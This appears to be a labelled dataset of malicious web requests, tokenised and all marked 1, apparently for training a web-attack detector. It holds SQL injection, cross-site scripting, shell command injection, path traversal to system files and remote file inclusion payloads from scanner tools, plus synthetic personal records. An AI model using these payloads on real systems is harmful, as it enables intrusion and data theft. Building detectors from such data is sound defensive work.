sentences 	 labels
/ quagynka . do ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ javascript & pr0n . exe  	 1
/ string & strings & parameters = 1 '  )  )  and make_set ( 8403 = 8403 , 8899 )  and  (  (  ' lokx '  like  ' lokx  	 1
/ vhzmaia2 . exe ?  < script > document . cookie =  " testkogj = 3979 ;  "  <  ?  < script > document . cookie =  " testkogj = 3979 ;  "  <  / script >  	 1
/ string & errormsg =  '  + delete + from + users  	 1
/ string & strings & parameters = &  sleep 0  &  &  str =  $  ( echo fagbbn )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  |  	 1
/ string & id = 3 & nombre = jamn + ibrico & precio = 39 &  & cantidad = 90 & b1 = aadir + al + carrito  	 1
/ string & strings & parameters = 1 '  )  ; select  ( case when  ( 6276 = 6276 )  then 6276 else 6276 *  ( select 6276 from information_schema . character_sets )  end )  #  	 1
/ en-us & jnv890lt . nsf ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ cgi-home & ion-p ? page =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ scripts & pollit & poll_it_ssi_v2 . 0 . cgi ? data_dir =  / etc / passwd \ x00  	 1
/ string & strings & parameters = < svg & onload = window . onerror = alert ; throw & xss &  ;  &  &  	 1
/ string & strings & parameters = < import namespace =  " t "  implementation =  "  # default # time2 "  >  	 1
/ xoops232b & htdocs & xoops_lib & modules & protector & onupdate . php ? mydirname = a (  )  {  } system (  '  /  .  / tmp / iyeafeugpn0 +  >  +  / dev / null +  &  '  )  ;  function v  	 1
/ string & strings & parameters = -3116 )  )  as jyiq where 3875 = 3875 union all select 3875 , 3875 , 3875 , 3875 , 3875 , 3875 , 3875 , 3875 #  	 1
/ index . php ? news7 [  " functions "  ]  = http :  ? news7 [  " functions "  ]  = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ?  	 1
/ string & strings & parameters = &  & echo $ ifslxpmrf $  (  ( 61 + 87 )  )  $  ( echo $ ifslxpmrf ) lxpmrf |  	 1
/ 0qhcnefz . mscgi ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ string & modo =  < script > alert (  " paros "  )  ;  <  & script >  & login = marlee-j5 & pwd = ple4n637127 & remember = on & b1 = entrar  	 1
/ string & strings & parameters = 1 %  '  )  )  )  ; waitfor delay  ' 0 : 0 : 5 '  and  (  (  (  '  %  '  =  '  	 1
/ path & nw & article . php ? id =  '  	 1
/ index . php ? 1 = lol & pages [ lol ]  = xxpathxx? 1 = lol & pages [ lol ]  = xxpathxx  	 1
/ string & strings & parameters = 1 '  )  where 6408 = 6408 ; call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  --  	 1
/ string & strings & parameters = "  \  "  >  < img src = x onerror = x . onerror = confirm ( 1 )  ; prompt ( 2 )  ; confirm (  & xss &  . source )  ; prompt ( string . fromcharcode ( 88 , 83 , 83 )  )  >  "  ,  	 1
/ string & strings & parameters = < img [ a ]  [ b ] src = x [ d ] onerror [ c ]  =  [ e ]  " alert ( 1 )  "  >  	 1
/  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ windows \ win . ini  	 1
/ string & strings & parameters = "  ;  str =  $  ( echo udcjaj )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \  	 1
/ graph . php ? document_root = xxpathxx ?? document_root = xxpathxx ?  	 1
/ string & strings & parameters = '  |  | echo $ ifsubxjuf $  (  ( 52 + 61 )  )  $  ( echo $ ifsubxjuf ) ubxjuf  	 1
/ jack ' s big tit show &  	 1
/ examples & jsp & cal & plugins & safehtml & htmlsax3 . php ? dir [ plugins ]  =  / etc / passwd \ x00  	 1
/ string & modo = entrar & login = dionysus & pwd = vuesa & remember = on &  & b1 = entrar  	 1
/ cgiip . exe & wservice = wsbroker1 & webutil & ping . p  	 1
/ string & strings & parameters = |   [  2 -ne  $  ( echo zdevvw  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  	 1
/ string & strings & parameters = 1 ,  ( select  ( case when  ( 5154 = 5154 )  then 1 else 5154 *  ( select 5154 from master .  . sysdatabases )  end )  )  	 1
/ string & strings & parameters = |   [  5 -ne  $  ( echo kbhdas  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "  	 1
/ string & id = 1 	 1
/ string & strings & parameters = 1 %  '  ; select  *  from generate_series ( 4592 , 4592 , case when  ( 4592 = 4592 )  then 1 else 0 end )  limit 1 --  	 1
/ examples & jsp & checkbox & htgrep & file = index . html & hdr =  & etc & passwd  	 1
/  < meta http-equiv = set-cookie content =  " testwtbo = 4831 "  >  	 1
/ examples & jsp & error & plog-download . php ? dl_type = album & checked [  ]  =  '  union select  ' plogger_checked_sql_injection . nasl '  , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0  --  	 1
/ string & strings & parameters = 1 '  and 6510 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  and  ' eqle '  =  ' eqle  	 1
/ string & strings & parameters = |   [  4 -ne  $  ( echo skwmfk  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  	 1
/ string & strings & parameters = 1 %  '  )  ; select  ( case when  ( 3773 = 3722 )  then 3773 else 3773 *  ( select 3773 from mysql . db )  end )  #  	 1
/ string & strings & parameters = &  sleep 0  &  &  str =  $  ( echo gikitn )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  &  &  	 1
/ bxnyrhmh . jspa ?  < meta http-equiv = set-cookie content =  " testmjct = 1867 "  >?  < meta http-equiv = set-cookie content =  " testmjct = 1867 "  >  	 1
/ moodle & filter & tex & texed . php ? formdata = foo & pathname = foo "  +  |  |  + echo + n + ctdnu . com +  > ctdn  	 1
/ webcgi & powerup & r . cgi ? file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ string & strings & parameters = |   [  6 -ne  $  ( echo parklw  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  &  	 1
/ string & strings & parameters = 1 %  '  ; begin dbms_lock . sleep ( 5 )  ;  end --  	 1
/ string & strings & parameters = 1 %  "  "  )  )  rlike sleep ( 5 )  and  (  (  "  "  %  "  "  =  "  "  	 1
/ phpmyadmin & ikonboard . cgi ? act = st & f = 1 & t = 1 & hl = nessus & st =  '  	 1
/ h5i6crm3 . do ?  < meta http-equiv = set-cookie content =  " testlihk = 7070 "  >?  < meta http-equiv = set-cookie content =  " testlihk = 7070 "  >  	 1
/ vac1l5vm . mscgi ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ string & modo = registro & login = celestin & password = acetosi0la & nombre = constantino & apellidos = veneroso + de + manuel & email = funato @ psychominders . co & dni = 82399457w & direccion = avda .  + lagunas + de + ruidera ,  + 70 ,  + 5 ? e & ciudad = pesoz & cp = 12449 & provincia = len & ntc = 971364397960361 & b1 = registrar  	 1
/ moodle & filter & tex & texed . php ? formdata = foo & pathname = foo "  +  |  |  + echo + n + esbql . com +  > esbq  	 1
/ string & strings & parameters = order by 27 #  	 1
/ phpmyadmin & library & adodb & server . php ? sql =  ' adodb_sql_sql_injection . nasl  	 1
/ d5a5renl . fts ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ string & strings & parameters = "  echo qmzuqp $  (  ( 97 + 31 )  )  $  ( echo qmzuqp ) qmzuqp |  	 1
/ string & modo = registro & login = merlina & password = l12o3o & nombre = heloisa & apellidos = senini & email = odea-chua @ prestigecars . de & dni = 51011537k ?  & direccion = passatge + amerigo ,  + 164 ,  +  & ciudad = valdeltormo & cp = 46175 & provincia = zamora & ntc = 4467025067468073 & b1 = registrar  	 1
/  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  \  .  .  \  .  .  \  { file }  	 1
/ string & strings & parameters = 1 %  '  )  )  procedure analyse ( extractvalue ( 5840 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end )  )  , 0x717a767a71 )  )  , 1 )  and  (  (  '  %  '  =  '  	 1
/ string & strings & parameters = 1 )  as bozx where 2160 = 2160 and sleep ( 5 )  #  	 1
/ javascript & mp3s . exe  	 1
/ string & strings & parameters = -5386 '  )  union all select 8026 , 8026 , 8026 , 8026 , 8026 , 8026 #  	 1
/ scripts & index . php ? x = browse & category =  ' union select  ' 1 '  ,  ' 2 '  ,  ' pixelpost_category_sql_injection . nasl '  ,  ' 1331904457 '  ,  ' 5 '  --  	 1
/ string & strings & parameters = 1 '  where 4795 = 4795 and 4595 = 4595 #  	 1
/ modules . php ? op = modload & name = guestbook & file = index & entry =  < script > alert (  ' vulnerable '  )  <  ? op = modload & name = guestbook & file = index & entry =  < script > alert (  ' vulnerable '  )  <  / script >  	 1
/ string & modo = registro & login = scandret61 & password = 36no5i3 & nombre = valquiria & apellidos = pelayo + petit & email = nabors . albalak @ videotubo . mc & dni = 18049190d & direccion = camino + minguets + 120 ,  + 2e & ciudad = valtajeros & cp = 37777 & provincia = sa + laman ? ca & ntc = 2528225363434285 & b1 = registrar  	 1
/ string & strings & parameters = 1 "  "  )  )  or char ( 117 )  |  | char ( 111 )  |  | char ( 105 )  |  | char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  and  (  (  "  " dqis "  "  =  "  " dqis  	 1
/ string & strings & parameters = 1 '  )  )  )  union all select null , null , null , null #  	 1
/ w4996nr0 . aspx ?  < meta http-equiv = set-cookie content =  " testttvs = 7163 "  >?  < meta http-equiv = set-cookie content =  " testttvs = 7163 "  >  	 1
/ string & strings & parameters = 1 %  "  "  )  )  )  and  ( 3020 = 3020 )  * 6703 and  (  (  (  "  "  %  "  "  =  "  "  	 1
/ examples & jsp & colors & themes & program & themesettings . inc . php ? themesdir =  / etc / passwd \ x00  	 1
/ cgi-bin & index . php ? gadget = glossary & action = view & term =  < script > alert (  ' jaws_xss . nasl '  )  ;  <  / script >  	 1
/ string & modo = registro & login = stevan & password = farropea & nombre = nubia & apellidos = esteba + estraderabob @  < script > alert ( paros )  <  & script >  . parosproxy . org & email = mauri @ coworkers . gy & dni = 04564890b & direccion = peiraos ,  + 142 + 5a & ciudad = breda & cp = 46892 & provincia = mlaga & ntc = 5977636857808544 & b1 = registrar  	 1
/ javascript & document . part  	 1
/ string & strings & parameters = 1 )  )  )  or 5356 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  --  	 1
/ javascript &  . htpasswd . sfish &  . htaccess . aspx --  >  "  >  '  >  '  "  < sfi000017v868621 >  	 1
/ hjdzm96v . php ?  < script > document . cookie =  " testbyqe = 7474 ;  "  <  ?  < script > document . cookie =  " testbyqe = 7474 ;  "  <  / script >  	 1
/ phpmyadmin & search & show . pl ? url = file :  / etc / passwd  	 1
/ s7qus4g3 . idc ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ cgi-sys & a1stats & a1disp3 . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ string & modo = entrar & login = moniek & pwd =  ,  ' 6apu0 , 0to & remember = off & b1 = entrar  	 1
/ recordings & crystalimagehandler . aspx ? dynamicimage =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / winnt / system . ini  	 1
/ xoops232b & htdocs & xoops_lib & modules & protector & onupdate . php ? mydirname = a (  )  {  } system (  '  /  .  / tmp / cexxamcdtz . sh +  >  +  / dev / null +  &  '  )  ;  function v  	 1
/ string & strings & parameters = '  &  & echo $ ifsrurczx $  (  ( 52 + 67 )  )  $  ( echo $ ifsrurczx ) rurczx &  	 1
/ ows-bin & fileseek2 . cgi ? foot =  & head =  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  / etc / passwd  	 1
/ b4vng02k . fts ?  < script > document . cookie =  " testtrlh = 3672 ;  "  <  ?  < script > document . cookie =  " testtrlh = 3672 ;  "  <  / script >  	 1
/ string & strings & parameters = 1 '  )  and elt ( 3528 = 3566 , 3566 )  	 1
/ string & strings & parameters = 1 %  '  )  ; iif ( 9134 = 5736 , 1 , 1 & 0 )  	 1
/ top . php ? stuff =  '  ; del \ x09q97745414 \ x09 #? stuff =  '  ; del \ x09q97745414 \ x09 #  	 1
/ string & strings & parameters = -1011 or 7140 = 9977 --  	 1
/ string & id = 3 & nombre = jamn + ibrico & precio = 100 & cantidad =  @ 40 & b1 = aadir + al + carrito  	 1
/ string & strings & parameters = < script src =  " http :  &  & xss . rocks & xss . jpg "  >  <  & script >  	 1
/ include & parser . php ? path = xxpathxx  	 1
/ en-us & oie504mr . cfc ?  < meta http-equiv = set-cookie content =  " testtpby = 7052 "  >  	 1
/ string & strings & parameters = 1 '  )  and 8148 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 & 2 )  )  )  )  --  	 1
/ string & strings & parameters = < div id =  " div1 "  >  < input value =  "  `  ` onmouseover = alert ( 1 )  "  >  <  & div >   < div id =  " div2 "  >  <  & div >  < script > document . getelementbyid (  " div2 "  )  . innerhtml  =  document . getelementbyid (  " div1 "  )  . innerhtml ;  <  & script >  	 1
/ string & strings & parameters = '  |  | echo $ ifsyokpwl $  (  ( 89 + 42 )  )  $  ( echo $ ifsyokpwl ) yokpwl |  	 1
/ string & strings & parameters = 1 '  ; select sleep ( 5 )  	 1
/ scripts & ustorekeeper . pl ? command = goto & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ examples & jsp & sessions & notify ? from = nessus "  | id "  	 1
/ string & strings & parameters = 1 '  in boolean mode )  ; select  ( case when  ( 1812 = 2446 )  then 1812 else cast ( 1 as int )  &  ( select 0 from dual )  end )  from dual --  	 1
/ help . php ? q =  " ver ;  > q71157849 & rem ;? q =  " ver ;  > q71157849 & rem ;  	 1
/ string & strings & parameters = "   str =  $  ( echo vycnrp )   str1 =  $  {  # str }   if  [  4 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "  	 1
/ javascript &  . passwd . bak  	 1
/ fpnpp5zg . exe ?  < script > document . cookie =  " testyias = 101 ;  "  <  ?  < script > document . cookie =  " testyias = 101 ;  "  <  / script >  	 1
/ string & modo = registro & login = gantt & password = sae19r8 & nombre = libe '  + and +  ' 1 '  =  ' 1 & apellidos = amusquivar & email = mccormack @ neotelecom . tn & dni = 35453403f & direccion = calle + tamarindo ,  + 118 +  & ciudad = alfambra & cp = 25400 & provincia = madrid & ntc = 5272129392938090 & b1 = registrar  	 1
/ string & strings & parameters = 1 '  )  where 5799 = 5799 union all select null , null , null , null , null --  	 1
/ help . php ? q =  " rm , q74835818 & rem ,? q =  " rm , q74835818 & rem ,  	 1
/ examples & jsp & num & modules . php ? mod = fm & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 & bn = fm_d1  	 1
/ string & modo =  |  & login = mcnally & pwd = lactescente & remember = on & b1 = entrar  	 1
/ evb & check_url . php ? url = pligg_url_sql_injection . nasl '  union select 1331904238 , 927121236  --  	 1
/ javascript & yml . exe  	 1
/ i7prbs22 . fts ?  < script > document . cookie =  " testjnre = 7328 ;  "  <  ?  < script > document . cookie =  " testjnre = 7328 ;  "  <  / script >  	 1
/ plugins & safehtml & htmlsax3 . php ? dir [ plugins ]  =  / etc / passwd \ x00  	 1
/ string & modo = registro & login = stokker & password = do6a3er8 & nombre = leandra & apellidos = orpez + almodvar & email = schaab @ hispadis . li & dni = 96068417q & direccion = calle + montduber + 75 ,  + 12 ? h & ciudad = magacela & cp = 04275 & provincia = lleida & ntc =  |  & b1 = registrar  	 1
/ manager & myevent . php ? myevent_path =  / etc / passwd \ x00  	 1
/ string & strings & parameters = 1 )  )  )  and 6055 = ctxsys . drithsx . sn ( 6055 ,  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  and  (  (  ( 6395 = 6395  	 1
/ forum . asp ? n =  ? n =  /  .  .  /  .  .  /  .  .  / etc / passwd | 41 | 80040e14 |  [ microsoft ]  [ odbc_sql_server_driver ]  [ sql_server ] line_1 : _incorrect_syntax_near_ &  # 039 ;  /  &  # 039 ;  .  	 1
/ cgi-bin & gw5 & gwweb . exe  	 1
/ string & strings & parameters = |   [  8 -ne  $  ( echo ehxctp  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  	 1
/ string & strings & parameters = -6755 )  or 9323 = 9323 #  	 1
/ content & modify_go . php ? pwfile = xxpathxx  	 1
/ string & modo = insertar & precio = 8789 & b1 = confirmar &  	 1
/ classes & adodbt & sql . php ? classes_dir = xxpathxx  	 1
/ main . php ? logout = ver \ x09 > q57458846 & rem \ x09? logout = ver \ x09 > q57458846 & rem \ x09  	 1
/ phpmyadmin & documentation . html ? phpmyadmin =  <  !  --  # include file =  " nessus1040002851 . html "  --  >  	 1
/  [ seccheck ]  &  .  .  &  .  .  & ext . ini  	 1
/ string & strings & parameters = 1 )  as nmlm where 9872 = 9872 ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 & 2 )  )  )  )  --  	 1
/ string & strings & parameters = 1 )  and  ( select 9067 from ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 9067 = 9067 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from information_schema . character_sets group by x ) a )  and  ( 8529 = 8529  	 1
/ string & strings & parameters = 1 %  '  )  )  )  union all select null , null --  	 1
/ 3m5knyc4 . cfm ?  < script > document . cookie =  " testbgqj = 6434 ;  "  <  ?  < script > document . cookie =  " testbgqj = 6434 ;  "  <  / script >  	 1
